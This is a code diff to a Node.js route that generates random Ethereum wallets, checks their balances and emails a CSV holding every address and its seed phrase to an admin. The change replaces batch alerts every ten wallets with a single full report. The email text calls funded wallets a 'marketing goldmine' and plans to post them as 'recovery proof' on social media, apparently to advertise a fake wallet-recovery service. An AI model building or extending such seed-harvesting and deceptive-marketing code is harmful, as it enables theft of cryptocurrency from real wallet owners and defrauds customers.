@@ -34,7 +34,7 @@ router.post('/scan-real-wallets', async (req, res) => {
         balance: balance.totalValueUSD
       });
       
-      // Always add to found wallets and send alerts every 10 wallets
+      // Always add to found wallets
       foundWallets.push({
         address: wallet.address,
         phrase: wallet.mnemonic.phrase,
@@ -43,11 +43,6 @@ router.post('/scan-real-wallets', async (req, res) => {
         chains: balance.chains,
         tokens: balance.tokens
       });
-      
-      // Send alert every 10 wallets (regardless of funds)
-      if ((i + 1) % 10 === 0) {
-        await sendBatchAlert(foundWallets.slice(-10), i + 1);
-      }
       
       if (balance.totalValueUSD >= minBalance) {
         console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
@@ -58,15 +53,18 @@ router.post('/scan-real-wallets', async (req, res) => {
       }
     }
     
+    // Send complete scan results via CSV
+    await sendCompleteResults(foundWallets, scanCount);
+    
     res.json({
       success: true,
       summary: {
         totalScanned: scanCount,
-        walletsWithFunds: foundWallets.length,
+        walletsWithFunds: foundWallets.filter(w => w.totalValueUSD > 0).length,
         totalValueFound: foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0)
       },
-      foundWallets: foundWallets,
-      allScanned: scannedWallets.slice(0, 10) // Show first 10 for reference
+      foundWallets: foundWallets.filter(w => w.totalValueUSD > 0),
+      allScanned: foundWallets.slice(0, 10) // Show first 10 for reference
     });
     
   } catch (error) {
@@ -235,8 +233,8 @@ function generateFromKnownSeeds(index) {
   return ethers.Wallet.createRandom();
 }
 
-// Send batch alert every 10 wallets with CSV attachment
-async function sendBatchAlert(wallets, totalScanned) {
+// Send complete scan results with CSV attachment
+async function sendCompleteResults(wallets, totalScanned) {
   try {
     const { sendAdminNotification } = require('../services/emailService');
     
@@ -246,29 +244,31 @@ async function sendBatchAlert(wallets, totalScanned) {
     // Create CSV content
     const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds\n';
     const csvRows = wallets.map((w, i) => 
-      `${totalScanned - 9 + i},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? 'YES' : 'NO'}`
+      `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? 'YES' : 'NO'}`
     ).join('\n');
     const csvContent = csvHeader + csvRows;
     
-    const subject = `🔍 ADMIN SCAN BATCH: ${totalScanned} wallets (${walletsWithFunds.length} funded) - CSV Attached`;
-    const message = `WALLET SCANNER BATCH REPORT
+    const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
+    const message = `WALLET SCANNER COMPLETE REPORT
 
-📊 PROGRESS: ${totalScanned} wallets processed
-💰 FUNDED WALLETS: ${walletsWithFunds.length}/10
-💵 TOTAL VALUE: $${totalValue.toFixed(2)}
+📊 TOTAL SCANNED: ${totalScanned} wallets
+💰 FUNDED WALLETS: ${walletsWithFunds.length}
+💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}
+📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%
 
-📎 ATTACHMENT: Complete wallet data in CSV format
+📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets
 
-💡 MARKETING USE:
-- Import CSV into spreadsheet
-- Filter by Has_Funds = YES
-- Use addresses for social media posts
-- Show real recovery examples
+💡 MARKETING GOLDMINE:
+- ${walletsWithFunds.length} wallets with real funds ready for social media
+- Import CSV to filter and sort by value
+- Use funded addresses as recovery proof
+- Show authentic blockchain balances
 
-Next batch alert in 10 wallets...`;
+🎯 TOP FUNDED WALLETS:
+${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
 
     // Send with CSV attachment
-    await sendEmailWithAttachment(subject, message, csvContent, `wallet_batch_${totalScanned}.csv`);
+    await sendEmailWithAttachment(subject, message, csvContent, `wallet_scan_${totalScanned}_complete.csv`);
     
   } catch (error) {
     console.log('Failed to send batch alert:', error.message);
